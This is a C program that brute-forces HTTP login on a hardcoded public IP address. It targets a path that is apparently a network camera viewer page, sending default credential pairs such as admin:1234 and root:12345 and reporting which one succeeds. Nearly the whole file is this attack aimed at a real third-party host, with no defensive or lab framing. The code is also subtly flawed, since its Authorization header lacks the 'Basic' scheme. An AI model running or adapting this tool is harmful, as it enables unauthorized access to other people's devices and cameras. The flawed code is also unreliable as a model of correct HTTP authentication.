#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <time.h>
#include <unistd.h>

#define HOST "85.174.232.42"
#define PORT 80
#define PATH "/view/viewer_index.shtml"

const char *passwd[4][4]={
	{"admin", "1234"}, {"admin", "admin"},
	{"root", "1234"}, {"root", "12345"}
};

static const char base64_table[65] =
	"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static inline struct timeval timevalns(long long ns)
{
  struct timeval tv;
  tv.tv_sec=ns/1000000000LL;
  tv.tv_usec=(ns%1000000000LL)/1000;
  return tv;
}

/* https://github.com/torvalds/linux/blob/master/lib/base64.c */
static inline int base64_encode(const u_char *src, int srclen, char *dst)
{
	u_int ac = 0;
	int bits = 0;
	int i;
	char *cp = dst;

	for (i = 0; i < srclen; i++) {
		ac = (ac << 8) | src[i];
		bits += 8;
		do {
			bits -= 6;
			*cp++ = base64_table[(ac >> bits) & 0x3f];
		} while (bits >= 6);
	}
	if (bits) {
		*cp++ = base64_table[(ac << (6 - bits)) & 0x3f];
		bits -= 6;
	}
	while (bits < 0) {
		*cp++ = '=';
		bits += 2;
	}
	return cp - dst;
}


static int try(int fd, const char *login, const char *pass, const char *path, const char *host)
{
	u_char req[BUFSIZ], auth[512],
		base64[512];
	int code, flag;
	ssize_t n;

	snprintf((char*)auth, sizeof(auth), "%s:%s", login, pass);
	base64_encode(auth, strlen((char*)auth), (char*)base64);

	snprintf((char *)req, sizeof(req),
		"GET %s HTTP/1.1\r\n"
		"Host: %s\r\n"
		"Connection: close\r\n"
		"Authorization: %s\r\n"
		"\r\n",
		path, host, base64);

	if ((n=send(fd, req, strlen((char*)req), 0))<0)
		return 0;
	memset(req, 0, BUFSIZ);
	if ((n=recv(fd, req, BUFSIZ, 0))<0)
		return 0;

	for (flag=0,n=code=0;n<strlen((char*)req);n++) {
		if (isdigit(req[n])&&(req[n-1]==' '||flag)) {
			auth[code++]=req[n];
			if (!flag)
				flag++;
		}
		if (req[n]==0x0a)
			break;
	}
	code=atoi((char*)auth);

	printf("%d\n",code);
	if (code==200)
		return 1;

	return 0;
}

int main(void)
{
	struct sockaddr_in in;
	struct timeval tv;
	char rbuf[BUFSIZ];
	ssize_t n, n1;
	int fd;

	memset(&in, 0, sizeof(in));
	memset(&tv, 0, sizeof(tv));

	/* fill addr */
	in.sin_port=htons(PORT);
	in.sin_family=AF_INET;
	inet_pton(in.sin_family, HOST, &in.sin_addr);

	for (n1=0;n1<4;n1++) {

		if ((fd=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))<0)
			return 0;

		/* connect */
		if (connect(fd, (struct sockaddr*)&in, sizeof(in))<0)
			goto exit;

		/* set timeout */
		tv=timevalns(1000000000);
		if (setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv))<0)
			goto exit;
		if (setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv))<0)
			goto exit;

		n=try(fd, passwd[n1][0], passwd[n1][1], PATH, inet_ntoa(in.sin_addr));
		if (n) {
			printf("AEEE  %s:%s\n", passwd[n1][0], passwd[n1][1]);
			printf("\nSuccessful authentication! %s:%s\n", passwd[n1][0], passwd[n1][1]);
			break;
		}
		printf("FAIL  %s:%s\n", passwd[n1][0], passwd[n1][1]);
		close(fd);
	}
exit:
	close(fd);
	return 0;
}
